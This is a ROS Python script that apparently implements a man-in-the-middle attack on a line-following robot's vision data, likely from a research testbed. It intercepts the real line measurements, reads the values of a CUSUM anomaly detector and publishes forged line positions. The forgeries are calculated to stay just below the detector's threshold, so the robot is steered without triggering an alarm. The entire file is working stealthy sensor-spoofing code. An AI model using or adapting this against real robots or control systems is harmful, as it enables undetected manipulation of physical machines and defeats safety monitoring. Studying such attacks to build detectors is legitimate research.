#!/usr/bin/env python
import rospy
import time
import numpy as np
from como_image_processing.msg import LineData
from reference_monitor.msg import MITM
from decimal import Decimal

class LineDataFetcher:
	def __init__(self):
		self.data_sub = rospy.Subscriber("/real_line_data", LineData, self.data_callback, queue_size = 1)
		self.line_data = []
	def data_callback(self, linedata):
		self.line_data = linedata
		return
		
	def get_linedata(self):
		return self.line_data
		
		
class cusumFetcher:
	def __init__(self):
		self.data_sub = rospy.Subscriber("/cusum", MITM, self.data_callback, queue_size = 1)
		self.cusum_data = []
	def data_callback(self, linedata):
		self.cusum_data = linedata
		return
		
	def get_cusumdata(self):
		return self.cusum_data
		
		
def main():
	startTime = Decimal('{0:f}'.format(time.time()))
	rospy.init_node("MITM", anonymous=True)
	rate = rospy.Rate(60)
	line_fetcher = LineDataFetcher()
	cusum_fetcher= cusumFetcher()
	fake_line_data_pub = rospy.Publisher('/line_data', LineData, queue_size=1)
	flag = 0
	b_pos = 0.03
        b_angle = 0.08
        threshold_pos = 0.01
        threshold_angle = 0.01
	
	
	while not rospy.is_shutdown():
		real_line_data = line_fetcher.get_linedata()
		cusum_data = cusum_fetcher.get_cusumdata()
		
		if real_line_data == []:
			continue
		
		if cusum_data == []:
			fake_line_data_pub.publish(real_line_data.angle_radian,real_line_data.angle_degree,real_line_data.line_pos_x,real_line_data.line_pos_y)
		else:
			#print "attack####################################################################"
			endTime = Decimal('{0:f}'.format(time.time()))
			if endTime - startTime > 6 or flag > 0:
				
				flag = 1
				cusum_pos = cusum_data.cusum_pos
				cusum_angle = cusum_data.cusum_angle
				x_hat_pos = cusum_data.x_hat_pos
				x_hat_angle = cusum_data.x_hat_angle
	
				injected_pos       = x_hat_pos   + (-1 * threshold_pos)   + (-1 * b_pos)   - (-1 * cusum_pos)
				injected_angle_rad = x_hat_angle + threshold_angle + b_angle - cusum_angle
				injected_angle_degrees = injected_angle_rad*180/np.pi
		
				fake_line_data_pub.publish(real_line_data.angle_radian,real_line_data.angle_degree, injected_pos, real_line_data.line_pos_y)
				
				#fake_line_data_pub.publish(real_line_data.angle_radian,real_line_data.angle_degree,real_line_data.line_pos_x -0.09,real_line_data.line_pos_y)
			else:
				fake_line_data_pub.publish(real_line_data.angle_radian,real_line_data.angle_degree,real_line_data.line_pos_x,real_line_data.line_pos_y)
			
		
		#fake_line_data_pub.publish(real_line_data.angle_radian,real_line_data.angle_degree,real_line_data.line_pos_x,real_line_data.line_pos_y)
		rate.sleep()
		#time.sleep(8)
		



if __name__=='__main__':
	main()
